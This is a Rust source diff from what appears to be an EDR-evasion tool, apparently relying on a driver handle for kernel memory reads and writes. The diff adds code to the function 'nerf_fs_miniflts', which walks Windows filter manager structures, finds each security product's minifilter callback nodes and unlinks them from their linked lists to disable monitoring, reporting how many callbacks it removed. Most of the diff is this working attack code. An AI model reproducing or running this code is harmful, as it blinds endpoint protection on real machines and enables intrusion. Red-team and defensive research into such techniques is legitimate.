@@ -16,6 +16,13 @@ use crate::mem::{self, write_qword};
 use crate::km;
 use crate::pdb;
 
+#[repr(C)]
+#[derive(Debug, Default)]
+pub struct DbLnkLst {
+    pub next_node: u64,
+    pub prev_node: u64
+}
+
 
 /// Opens a handle to the device and returns it
 pub fn get_driver_handle() -> Result<HANDLE, u32> {
@@ -146,22 +153,7 @@ pub fn nerf_etw_prov(
 
 
 /// Read & disable an EDR file system minifilter
-/// pub struct FmOffsets {
-///     pub flt_globals: u64,
-///     pub globals_framelist: u64,
-///     pub flt_resource_list_head_rlist: u64,
-///     pub fltp_frame_links: u64,
-///     pub fltp_frame_registeredfilters: u64,
-///     pub flt_object_primarylink: u64,
-///     pub flt_filter_driverobject: u64,
-///     pub flt_filter_instancelist: u64,
-///     pub driver_object_driverinit: u64,
-///     pub flt_instance_callbacknodes: u64,
-///     pub flt_instance_filterlink: u64
-/// }  
 pub fn nerf_fs_miniflts(fm_base: u64, offsets: pdb::FmOffsets) -> windows::core::Result<()> {
-    let mut edr_cb_found: bool = false;
-
     // frame_list_header = fltmgr_base + FltGlobals + _GLOBALS_FrameList + _FLT_RESOURCE_LIST_HEAD_rList;
     let frame_list_header: u64 = fm_base 
         + offsets.flt_globals 
@@ -192,7 +184,7 @@ pub fn nerf_fs_miniflts(fm_base: u64, offsets: pdb::FmOffsets) -> windows::core:
             let driver_object = mem::read_qword(current_filter + offsets.flt_filter_driverobject)?;
             let driver_init = mem::read_qword(driver_object + offsets.driver_object_driverinit)?;
 
-            let mut drv_name;
+            let drv_name;
             match km::find_driver_name_from_addr(driver_init) {
                 Some(drv) => {
                     drv_name = drv; // take ownership of the String
@@ -213,17 +205,65 @@ pub fn nerf_fs_miniflts(fm_base: u64, offsets: pdb::FmOffsets) -> windows::core:
                 while current_instance_shifted != instance_list_header {
                     let current_instance = current_instance_shifted - offsets.flt_instance_filterlink;
                     let cb_nodes_array = current_instance + offsets.flt_instance_callbacknodes;
-                    println!("[|]       - [{}] _FLT_INSTANCE 0x{:16x} with callbacks at: 0x{:16x}", 
-                        drv_name, current_instance, cb_nodes_array
-                    );
+                    println!("[|]       - [{}] _FLT_INSTANCE 0x{:16x} with callback nodes at: 0x{:16x}", drv_name, current_instance, cb_nodes_array);
+
+                    let mut num_cb_nodes = 0;
+                    let mut num_cb_nodes_unlinked = 0;
+                    let max_cb_nodes = 50;
+                    while num_cb_nodes < max_cb_nodes {
+                        let cb_node_ptr = mem::read_qword(cb_nodes_array + (num_cb_nodes * 0x8))?;
+                        if cb_node_ptr != 0 {
+                            // Valid callback entry
+                            //println!("[|]         [DEBUG] Callback node: 0x{:16x}", cb_node_ptr);
+
+                            let prev_node = mem::read_qword(cb_node_ptr + 0x8)?;
+                            let next_node = mem::read_qword(cb_node_ptr + 0x0)?;
+                            //let prev_node_next = mem::read_qword(prev_node + 0x0)?;
+                            //let prev_node_prev = mem::read_qword(prev_node + 0x8)?;
+                            //let next_node_next = mem::read_qword(next_node + 0x0)?;
+                            //let next_node_prev = mem::read_qword(next_node + 0x8)?;
+                            
+                            /* DEBUG: print the node doubly linked list
+                            println!("[*]             PRE:       [Prev]       -        [This]     -       [Next]");
+                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node, cb_node_ptr, next_node);
+                            println!("[|]                 ------------------   ------------------   ------------------");
+                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node_next, next_node, next_node_next);
+                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node_prev, prev_node, next_node_prev);
+                            */
+
+                            // Now, unlink the list:
+                            let next_node_blink = next_node + 0x8;
+                            let prev_node_flink = prev_node + 0x0;
+                            mem::write_qword(next_node_blink, prev_node);
+                            mem::write_qword(prev_node_flink, next_node);
+
+                            /* DEBUG: print the node doubly linked list (again)
+                            let prev_node2 = mem::read_qword(cb_node_ptr + 0x8)?;
+                            let prev_node_next2 = mem::read_qword(prev_node + 0x0)?;
+                            let prev_node_prev2 = mem::read_qword(prev_node + 0x8)?;
+                            let next_node2 = mem::read_qword(cb_node_ptr + 0x0)?;
+                            let next_node_next2 = mem::read_qword(next_node + 0x0)?;
+                            let next_node_prev2 = mem::read_qword(next_node + 0x8)?;
+                            println!("[*]             POST:      [Prev]       -        [This]     -       [Next]");
+                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node2, cb_node_ptr, next_node2);
+                            println!("[|]                 ------------------   ------------------   ------------------");
+                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node_next2, next_node2, next_node_next2);
+                            println!("[|]                 0x{:16x} - 0x{:16x} - 0x{:16x}", prev_node_prev2, prev_node2, next_node_prev2);
+                            */
+                            
+                            // Increment our counter
+                            num_cb_nodes_unlinked += 1;
+                        }
+                        
+                        num_cb_nodes += 1;
+                    }
+
+                    println!("[+]         Removed {} callbacks from this instance", num_cb_nodes_unlinked);
 
                     // Get the next one before the loop check
                     current_instance_shifted = mem::read_qword(current_instance_shifted)?;
                 }
                 
-
-
-
             }
 
         }
